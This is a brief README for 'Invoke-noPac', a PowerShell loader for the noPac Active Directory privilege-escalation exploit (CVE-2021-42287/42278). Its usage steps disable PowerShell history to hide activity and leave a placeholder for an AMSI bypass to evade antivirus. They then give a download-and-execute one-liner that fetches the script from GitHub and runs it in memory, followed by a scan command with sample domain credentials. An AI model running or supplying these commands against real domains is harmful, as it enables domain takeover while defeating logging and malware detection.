# Invoke-noPac

Assembly loader for the CVE-2021-42287/CVE-2021-42278 Scanner & Exploiter (https://github.com/cube0x0/noPac), PowerSharpPack (https://github.com/S3cur3Th1sSh1t/PowerSharpPack) style.

Usage:

Set-PSReadlineOption -HistorySaveStyle SaveNothing

<Insert-Your-AMSI-Bypass-From-AMSI.FAIL-Here>

IEX(IWR -UseBasicParsing -UserAgent "hi-there-purple-team" 'https://raw.githubusercontent.com/ricardojba/Invoke-noPac/main/Invoke-noPac.ps1')

Invoke-noPac

Invoke-noPac -Command "scan -domain htb.local -user domain_user -pass 'Password123!'"
